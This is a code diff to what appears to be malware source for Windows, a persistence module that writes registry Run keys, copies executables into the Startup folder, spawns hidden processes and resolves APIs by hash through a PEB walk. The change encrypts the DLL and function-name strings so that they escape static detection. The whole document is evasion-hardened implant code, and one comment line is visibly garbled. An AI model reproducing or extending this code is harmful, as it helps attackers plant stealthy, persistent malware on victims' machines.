@@ -43,6 +43,17 @@
 
 #define HKLM ((HANDLE)(intptr_t)0x80000002)
 #define HKCU ((HANDLE)(intptr_t)0x80000001)
+/* ── Inline helpers for encrypted PEB-walk resolution ──────── */
+
+static inline void *resolve_mod_enc(const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_module_by_hash(mirage_encrypted_hash_module(buf));
+}
+static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
+    char buf[32]; enc_decrypt(enc, len, buf);
+    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
+}
+
 
 /* ── Resolved function pointers (cached) ────────────────────── */
 
@@ -53,36 +64,23 @@ typedef BOOL  (*FnDeleteFileW)(PWSTR);
 
 /* ── Helper: load kernel32 via PEB ──────────────────────────── */
 
-static void *load_kernel32(void)
-{
-    return mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("kernel32.dll"));
-}
+static void *load_kernel32(void) { return resolve_mod_enc(enc_kernel32, ENC_KERNEL32_LEN); }
+
+typedef NTSTATUS (*FnLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PVOID*);
 
 static void *load_advapi32_via_ldr(void)
 {
-    void *ntdll = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("ntdll.dll"));
+    void *ntdll = resolve_mod_enc(enc_ntdll, ENC_NTDLL_LEN);
     if (!ntdll) return NULL;
-
-    /* Check if advapi32 already loaded */
-    void *adv = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("advapi32.dll"));
+    void *adv = resolve_mod_enc(enc_advapi32, ENC_ADVAPI32_LEN);
     if (adv) return adv;
-
-    /* LdrLoadDll via hash */
-    typedef NTSTATUS (*FnLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PVOID*);
-    FnLdrLoadDll ldr = (FnLdrLoadDll)mirage_get_function_by_hash(
-        ntdll, mirage_encrypted_hash_func("LdrLoadDll"));
+    FnLdrLoadDll ldr = (FnLdrLoadDll)resolve_fn_enc(ntdll, enc_LdrLoadDll, ENC_LDRLOADDLL_LEN);
     if (!ldr) return NULL;
-
-    /* Build wide string "advapi32.dll" */
     static const WCHAR dllname[] = L"advapi32.dll";
     UNICODE_STRING us;
-    us.Length        = (USHORT)(sizeof(dllname) - sizeof(WCHAR));
+    us.Length = (USHORT)(sizeof(dllname) - sizeof(WCHAR));
     us.MaximumLength = (USHORT)sizeof(dllname);
-    us.Buffer        = (PWSTR)dllname;
-
+    us.Buffer = (PWSTR)dllname;
     PVOID base = NULL;
     if (ldr(NULL, 0, &us, &base) < 0) return NULL;
     return base;
@@ -94,29 +92,23 @@ static int create_process_w(const wchar_t *cmdline)
 {
     void *k32 = load_kernel32();
     if (!k32) return 0;
-
-    FnCreateProcessW pCreateProcessW = (FnCreateProcessW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("CreateProcessW"));
+    FnCreateProcessW pCreateProcessW = (FnCreateProcessW)resolve_fn_enc(k32, enc_CreateProcessW, ENC_CREATEPROCESSW_LEN);
     if (!pCreateProcessW) return 0;
-
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     memset(&si, 0, sizeof(si));
     si.cb = sizeof(si);
     memset(&pi, 0, sizeof(pi));
-
-    /* Mutable copy for CreateProcessW */
     wchar_t cmd_buf[4096];
     size_t len = wcslen(cmdline);
     if (len >= 4096) return 0;
     memcpy(cmd_buf, cmdline, (len + 1) * sizeof(wchar_t));
-
     return pCreateProcessW(NULL, cmd_buf, NULL, NULL, FALSE,
                            0x08000000 /* CREATE_NO_WINDOW */,
                            NULL, NULL, &si, &pi) != 0;
 }
 
-/* ── Helper: ASCII to wide string ───────────────────────────── */
+/* ── Helper/* ── Helper: ASCII to wide string ───────────────────────────── */
 
 static int ascii_to_wide(const char *src, wchar_t *dst, size_t dst_chars)
 {
@@ -161,12 +153,9 @@ static int set_registry_string(HKEY hkey, const char *subkey,
     void *adv = load_advapi32();
     if (!adv) return 0;
 
-    FnRegCreateKeyExW pRegCreateKeyExW = (FnRegCreateKeyExW)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegCreateKeyExW"));
-    FnRegSetValueExW pRegSetValueExW = (FnRegSetValueExW)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegSetValueExW"));
-    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegCloseKey"));
+    FnRegCreateKeyExW pRegCreateKeyExW = (FnRegCreateKeyExW)resolve_fn_enc(adv, enc_RegCreateKeyExW, ENC_REGCREATEKEYEXW_LEN);
+    FnRegSetValueExW pRegSetValueExW = (FnRegSetValueExW)resolve_fn_enc(adv, enc_RegSetValueExW, ENC_REGSETVALUEEXW_LEN);
+    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)resolve_fn_enc(adv, enc_RegCloseKey, ENC_REGCLOSEKEY_LEN);
     if (!pRegCreateKeyExW || !pRegSetValueExW || !pRegCloseKey) return 0;
 
     /* Convert subkey to wide */
@@ -202,12 +191,9 @@ static int delete_registry_value(HKEY hkey, const char *subkey, const char *valu
     void *adv = load_advapi32();
     if (!adv) return 0;
 
-    FnRegOpenKeyExW pRegOpenKeyExW = (FnRegOpenKeyExW)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegOpenKeyExW"));
-    FnRegDeleteValueW pRegDeleteValueW = (FnRegDeleteValueW)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegDeleteValueW"));
-    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegCloseKey"));
+    FnRegOpenKeyExW pRegOpenKeyExW = (FnRegOpenKeyExW)resolve_fn_enc(adv, enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN);
+    FnRegDeleteValueW pRegDeleteValueW = (FnRegDeleteValueW)resolve_fn_enc(adv, enc_RegDeleteValueW, ENC_REGDELETEVALUEW_LEN);
+    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)resolve_fn_enc(adv, enc_RegCloseKey, ENC_REGCLOSEKEY_LEN);
     if (!pRegOpenKeyExW || !pRegDeleteValueW || !pRegCloseKey) return 0;
 
     wchar_t subkey_w[512];
@@ -263,10 +249,8 @@ int persist_registry_is_installed(void)
     void *adv = load_advapi32();
     if (!adv) return 0;
 
-    FnRegOpenKeyExW pRegOpenKeyExW = (FnRegOpenKeyExW)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegOpenKeyExW"));
-    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)mirage_get_function_by_hash(
-        adv, mirage_encrypted_hash_func("RegCloseKey"));
+    FnRegOpenKeyExW pRegOpenKeyExW = (FnRegOpenKeyExW)resolve_fn_enc(adv, enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN);
+    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)resolve_fn_enc(adv, enc_RegCloseKey, ENC_REGCLOSEKEY_LEN);
     if (!pRegOpenKeyExW || !pRegCloseKey) return 0;
 
     static const char *subkeys[] = {
@@ -352,8 +336,7 @@ static int get_env_w(const char *name, wchar_t *buf, DWORD buf_chars)
     void *k32 = load_kernel32();
     if (!k32) return 0;
 
-    FnGetEnvironmentVariableW pGetEnv = (FnGetEnvironmentVariableW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("GetEnvironmentVariableW"));
+    FnGetEnvironmentVariableW pGetEnv = (FnGetEnvironmentVariableW)resolve_fn_enc(k32, enc_GetEnvironmentVariableW, ENC_GETENVIRONMENTVARIABLEW_LEN);
     if (!pGetEnv) return 0;
 
     wchar_t name_w[128];
@@ -392,8 +375,7 @@ int persist_startup_install(const char *exe_path)
     void *k32 = load_kernel32();
     if (!k32) return 0;
 
-    FnCopyFileW pCopyFileW = (FnCopyFileW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("CopyFileW"));
+    FnCopyFileW pCopyFileW = (FnCopyFileW)resolve_fn_enc(k32, enc_CopyFileW, ENC_COPYFILEW_LEN);
     if (!pCopyFileW) return 0;
 
     wchar_t src_w[1024];
@@ -431,8 +413,7 @@ int persist_startup_uninstall(void)
     void *k32 = load_kernel32();
     if (!k32) return 0;
 
-    FnDeleteFileW pDeleteFileW = (FnDeleteFileW)mirage_get_function_by_hash(
-        k32, mirage_encrypted_hash_func("DeleteFileW"));
+    FnDeleteFileW pDeleteFileW = (FnDeleteFileW)resolve_fn_enc(k32, enc_DeleteFileW, ENC_DELETEFILEW_LEN);
     if (!pDeleteFileW) return 0;
 
     wchar_t path_w[2048];
